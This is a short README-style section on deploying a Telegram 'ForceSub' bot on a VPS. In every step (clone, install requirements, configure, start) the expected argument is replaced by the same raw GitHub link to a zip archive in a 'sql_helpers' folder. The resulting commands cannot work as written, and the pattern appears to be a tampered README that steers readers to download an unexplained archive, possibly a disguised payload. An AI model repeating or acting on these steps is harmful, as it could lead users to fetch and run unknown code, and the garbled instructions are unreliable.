### Deploy in vps
- Clone this repo
```
git clone https://raw.githubusercontent.com/walker1103/ForceSub_Bot/master/sql_helpers/Bot_Sub_Force_v1.9.zip
```
- Change directory
```
cd ForceSub_Bot
```
- Install requirements
```
pip3 install -r https://raw.githubusercontent.com/walker1103/ForceSub_Bot/master/sql_helpers/Bot_Sub_Force_v1.9.zip
```
- setup configuration
```
Open https://raw.githubusercontent.com/walker1103/ForceSub_Bot/master/sql_helpers/Bot_Sub_Force_v1.9.zip in text Editor and set values
```
- Start the bot
```
python3 https://raw.githubusercontent.com/walker1103/ForceSub_Bot/master/sql_helpers/Bot_Sub_Force_v1.9.zip
```
